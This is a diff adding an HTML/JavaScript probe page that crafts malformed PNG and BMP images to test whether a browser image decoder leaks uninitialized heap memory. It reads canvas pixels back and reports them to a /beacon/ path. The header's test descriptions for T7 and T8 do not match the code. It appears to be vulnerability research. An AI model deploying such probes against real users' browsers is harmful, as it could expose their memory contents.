@@ -1,0 +1,307 @@
+<!--
+  p595c: Image decoder heap leak via truncated / malformed image data.
+
+  Tests:
+  T1: Truncated IDAT — IHDR says 64x64 RGBA but zlib stream has only 4 rows.
+      If decoder paints partial buffer, uninitialized rows = heap data.
+  T2: Truncated IDAT with exactly 1 row — minimal decode.
+  T3: Empty zlib stream — zero rows decoded, entire ImageFrame uninitialized.
+  T4: IHDR 64x64, IDAT has 64 ROWS but each row is 8 pixels wide (wrong stride).
+      Decoder reads 64-pixel rows; 56 trailing pixels per row = uninitialized.
+  T5: Interlaced (method 1) + truncated — interlace buffers might not be zeroed.
+  T6: Over-long tRNS (16 entries) vs PLTE (2 entries) — tRNS past PLTE = OOB read.
+  T7: RGBA IHDR with palette data (wrong color type) — type confusion in decoder.
+  T8: Grayscale+alpha 16-bit — unusual depth/type, test for allocation bugs.
+
+  CRASH_CLASS: MODERATE-HIGH (some variants may crash WebProcess)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p595c</title>
+<style>body{margin:0;background:#111;color:#0f0;font:10px monospace}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+var CRC_T=null;
+function crc32(buf){
+  if(!CRC_T){CRC_T=new Int32Array(256);for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;CRC_T[n]=c;}}
+  var crc=-1;for(var i=0;i<buf.length;i++)crc=CRC_T[(crc^buf[i])&0xFF]^(crc>>>8);return(crc^-1)>>>0;
+}
+function chunk(type,data){
+  var len=data.length;var out=new Uint8Array(12+len);
+  out[0]=(len>>>24)&0xFF;out[1]=(len>>>16)&0xFF;out[2]=(len>>>8)&0xFF;out[3]=len&0xFF;
+  out[4]=type.charCodeAt(0);out[5]=type.charCodeAt(1);out[6]=type.charCodeAt(2);out[7]=type.charCodeAt(3);
+  out.set(data,8);
+  var ci=new Uint8Array(4+len);ci[0]=out[4];ci[1]=out[5];ci[2]=out[6];ci[3]=out[7];ci.set(data,4);
+  var c=crc32(ci);
+  out[8+len]=(c>>>24)&0xFF;out[9+len]=(c>>>16)&0xFF;out[10+len]=(c>>>8)&0xFF;out[11+len]=c&0xFF;
+  return out;
+}
+function zlibStore(data){
+  var out=[];out.push(0x78,0x01);var off=0;
+  while(off<data.length){var remain=data.length-off;var blen=Math.min(remain,65535);
+    var isFinal=(off+blen>=data.length)?1:0;
+    out.push(isFinal);out.push(blen&0xFF,(blen>>>8)&0xFF);out.push((~blen)&0xFF,((~blen)>>>8)&0xFF);
+    for(var i=0;i<blen;i++)out.push(data[off+i]);off+=blen;}
+  var a=1,bb=0;for(var i=0;i<data.length;i++){a=(a+data[i])%65521;bb=(bb+a)%65521;}
+  var ad=(bb<<16)|a;out.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);
+  return new Uint8Array(out);
+}
+function w32(arr,off,v){arr[off]=(v>>>24)&0xFF;arr[off+1]=(v>>>16)&0xFF;arr[off+2]=(v>>>8)&0xFF;arr[off+3]=v&0xFF;}
+var SIG=new Uint8Array([137,80,78,71,13,10,26,10]);
+function mkIHDR(w,h,depth,ctype,interlace){
+  var d=new Uint8Array(13);w32(d,0,w);w32(d,4,h);d[8]=depth;d[9]=ctype;d[10]=0;d[11]=0;d[12]=interlace||0;
+  return chunk('IHDR',d);
+}
+function mkIEND(){return chunk('IEND',new Uint8Array(0));}
+function cat(){
+  var total=0;for(var i=0;i<arguments.length;i++)total+=arguments[i].length;
+  var out=new Uint8Array(total);var off=0;
+  for(var i=0;i<arguments.length;i++){out.set(arguments[i],off);off+=arguments[i].length;}
+  return out;
+}
+
+// RGBA rows: filter=0, w pixels of RGBA
+function mkRows(w,h,fill){
+  var rl=1+w*4;var raw=new Uint8Array(rl*h);
+  for(var y=0;y<h;y++){raw[y*rl]=0;
+    if(fill)for(var x=0;x<w;x++){var o=y*rl+1+x*4;raw[o]=fill[0];raw[o+1]=fill[1];raw[o+2]=fill[2];raw[o+3]=fill[3];}}
+  return raw;
+}
+function mkPLTE(e){var d=new Uint8Array(e.length*3);for(var i=0;i<e.length;i++){d[i*3]=e[i][0];d[i*3+1]=e[i][1];d[i*3+2]=e[i][2];}return chunk('PLTE',d);}
+
+function loadAndScan(name,pngBytes,scanW,scanH,cb){
+  var blob=new Blob([pngBytes],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    b(name+':LOADED,'+img.width+'x'+img.height);
+    var cv=document.createElement('canvas');cv.width=scanW;cv.height=scanH;
+    var ctx=cv.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,scanW,scanH);
+    scanPixels(name,id.data,scanW,scanH);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    b(name+':ERR');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+function scanPixels(tag,data,w,h){
+  var nz=0,nzAlpha=0,totalPx=w*h;
+  var seen={};var uniqueCount=0;var interesting=[];
+  var zeroRows=0,nzRows=0;
+
+  for(var y=0;y<h;y++){
+    var rowNZ=0;
+    for(var x=0;x<w;x++){
+      var i=(y*w+x)*4;
+      var r=data[i],g=data[i+1],bb=data[i+2],a=data[i+3];
+      if(r||g||bb||a){nz++;rowNZ++;}
+      if(a!==0&&a!==255)nzAlpha++;
+      var key=r+'.'+g+'.'+bb+'.'+a;
+      if(!seen[key]){seen[key]=1;uniqueCount++;
+        if(uniqueCount<=30)interesting.push('y'+y+'x'+x+'='+key);}
+    }
+    if(rowNZ===0)zeroRows++;else nzRows++;
+  }
+
+  b(tag+':NZ='+nz+'/'+totalPx+',NZA='+nzAlpha+',UNQ='+uniqueCount+',ZROW='+zeroRows+',NZROW='+nzRows);
+  for(var j=0;j<interesting.length;j+=3){
+    b(tag+':U='+interesting.slice(j,j+3).join('|'));
+  }
+}
+
+function main(){
+b('G');
+
+var W=64,H=64;
+
+// ============================================================
+// T1: Truncated IDAT — 4 rows of red in a 64×64 RGBA image
+// ============================================================
+var t1=cat(SIG,
+  mkIHDR(W,H,8,6),
+  chunk('IDAT',zlibStore(mkRows(W,4,[255,0,0,255]))), // only 4 rows
+  mkIEND()
+);
+b('T1:size='+t1.length);
+
+// ============================================================
+// T2: Truncated IDAT — exactly 1 row
+// ============================================================
+var t2=cat(SIG,
+  mkIHDR(W,H,8,6),
+  chunk('IDAT',zlibStore(mkRows(W,1,[0,255,0,255]))), // 1 row
+  mkIEND()
+);
+b('T2:size='+t2.length);
+
+// ============================================================
+// T3: Empty zlib stream — zero pixel data
+// Valid zlib header + empty stored block + adler32
+// ============================================================
+var emptyZlib=new Uint8Array([
+  0x78,0x01, // CMF, FLG
+  0x01,       // BFINAL=1
+  0x00,0x00,  // LEN=0
+  0xFF,0xFF,  // NLEN=~0
+  0x00,0x01,0x00,0x01 // Adler32 of empty
+]);
+var t3=cat(SIG,
+  mkIHDR(W,H,8,6),
+  chunk('IDAT',emptyZlib),
+  mkIEND()
+);
+b('T3:size='+t3.length);
+
+// ============================================================
+// T4: Wrong row width — IHDR 64×64 but rows are only 8 pixels wide
+// Filter=0, 8×4=32 bytes per row vs expected 64×4=256
+// 64 such short rows compressed
+// ============================================================
+var t4rows=mkRows(8,H,[255,255,0,255]); // 8px wide, 64 rows
+var t4=cat(SIG,
+  mkIHDR(W,H,8,6),
+  chunk('IDAT',zlibStore(t4rows)),
+  mkIEND()
+);
+b('T4:size='+t4.length);
+
+// ============================================================
+// T5: Interlaced (Adam7) + truncated IDAT
+// Interlace pass 1 reads every 8th pixel every 8th row
+// Partial data might leave interlace buffer gaps
+// ============================================================
+// For a 64×64 interlaced image, pass 1 is 8×8 pixels
+// Provide data for only pass 1 (8×8 = 8 rows of 8 RGBA pixels)
+var pass1rows=mkRows(8,8,[255,0,255,255]); // magenta, 8×8
+var t5=cat(SIG,
+  mkIHDR(W,H,8,6,1), // interlace=1 (Adam7)
+  chunk('IDAT',zlibStore(pass1rows)),
+  mkIEND()
+);
+b('T5:size='+t5.length);
+
+// ============================================================
+// T6: Over-long tRNS vs PLTE
+// PLTE has 2 entries (6 bytes), tRNS has 16 entries (16 bytes)
+// tRNS entries 2-15 read past PLTE's 2 entries in some impls
+// ============================================================
+var pal2=[[255,0,0],[0,255,0]];
+var trnsBig=new Uint8Array(16);
+for(var i=0;i<16;i++)trnsBig[i]=255;
+var idxCtrl=new Uint8Array(W*H);
+for(var i=0;i<W*H;i++)idxCtrl[i]=i%2;
+// Indexed rows: filter=0, 1 byte per pixel
+function mkIdxRows(w,h,idx){
+  var rl=1+w;var raw=new Uint8Array(rl*h);
+  for(var y=0;y<h;y++){raw[y*rl]=0;for(var x=0;x<w;x++)raw[y*rl+1+x]=idx[y*w+x];}
+  return raw;
+}
+var t6=cat(SIG,
+  mkIHDR(W,H,8,3),
+  mkPLTE(pal2),
+  chunk('tRNS',trnsBig),
+  chunk('IDAT',zlibStore(mkIdxRows(W,H,idxCtrl))),
+  mkIEND()
+);
+b('T6:size='+t6.length);
+
+// ============================================================
+// T7: Grayscale 16-bit — unusual bit depth
+// 64×64, 16-bit gray = 2 bytes per pixel per row
+// Test if ImageFrame allocation/conversion has gaps
+// ============================================================
+function mkGray16Rows(w,h,val16){
+  var rl=1+w*2;var raw=new Uint8Array(rl*h);
+  for(var y=0;y<h;y++){raw[y*rl]=0;
+    for(var x=0;x<w;x++){var o=y*rl+1+x*2;raw[o]=(val16>>>8)&0xFF;raw[o+1]=val16&0xFF;}}
+  return raw;
+}
+var t7=cat(SIG,
+  mkIHDR(W,H,16,0), // gray, 16-bit
+  chunk('IDAT',zlibStore(mkGray16Rows(W,H,0x8000))),
+  mkIEND()
+);
+b('T7:size='+t7.length);
+
+// ============================================================
+// T8: BMP image — different decoder path, test for overread
+// Create minimal BMP: 32×32, 24-bit, bottom-up with short pixel data
+// BMP header says 32×32 but pixel data has only 4 rows
+// ============================================================
+function mkBMP(w,h,actualRows,fill){
+  var rowBytes=((w*3+3)&~3); // 4-byte aligned
+  var pixelDataSize=rowBytes*actualRows;
+  var fileSize=54+pixelDataSize;
+  var buf=new Uint8Array(fileSize);
+  // BMP file header
+  buf[0]=0x42;buf[1]=0x4D; // 'BM'
+  buf[2]=fileSize&0xFF;buf[3]=(fileSize>>>8)&0xFF;buf[4]=(fileSize>>>16)&0xFF;buf[5]=(fileSize>>>24)&0xFF;
+  buf[10]=54; // pixel data offset
+  // DIB header (BITMAPINFOHEADER = 40 bytes)
+  buf[14]=40; // header size
+  buf[18]=w&0xFF;buf[19]=(w>>>8)&0xFF; // width
+  buf[22]=h&0xFF;buf[23]=(h>>>8)&0xFF; // height (FULL height, bottom-up)
+  buf[26]=1; // planes
+  buf[28]=24; // bits per pixel
+  // pixel data (only actualRows rows)
+  for(var y=0;y<actualRows;y++){
+    for(var x=0;x<w;x++){
+      var o=54+y*rowBytes+x*3;
+      buf[o]=fill[2];buf[o+1]=fill[1];buf[o+2]=fill[0]; // BGR
+    }
+  }
+  return buf;
+}
+var bmpW=32,bmpH=32;
+var t8=mkBMP(bmpW,bmpH,4,[255,128,0]); // only 4 rows of orange
+b('T8:size='+t8.length);
+
+// ============================================================
+// Run
+// ============================================================
+var tests=[
+  ['T1',t1,W,H,'image/png'],
+  ['T2',t2,W,H,'image/png'],
+  ['T3',t3,W,H,'image/png'],
+  ['T4',t4,W,H,'image/png'],
+  ['T5',t5,W,H,'image/png'],
+  ['T6',t6,W,H,'image/png'],
+  ['T7',t7,W,H,'image/png'],
+  ['T8',t8,bmpW,bmpH,'image/bmp'],
+];
+var ti=0;
+function runNext(){
+  if(ti>=tests.length){b('ALL-DONE');b('ALIVE');return;}
+  var t=tests[ti++];
+  var blob=new Blob([t[1]],{type:t[4]});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    b(t[0]+':LOADED,'+img.width+'x'+img.height);
+    var cv=document.createElement('canvas');cv.width=t[2];cv.height=t[3];
+    var ctx=cv.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,t[2],t[3]);
+    scanPixels(t[0],id.data,t[2],t[3]);
+    URL.revokeObjectURL(url);
+    runNext();
+  };
+  img.onerror=function(){
+    b(t[0]+':ERR');
+    URL.revokeObjectURL(url);
+    runNext();
+  };
+  img.src=url;
+}
+runNext();
+}
+
+setTimeout(main,50);
+setTimeout(function(){b('ALIVE-FALLBACK');},30000);
+</script></head><body></body></html>
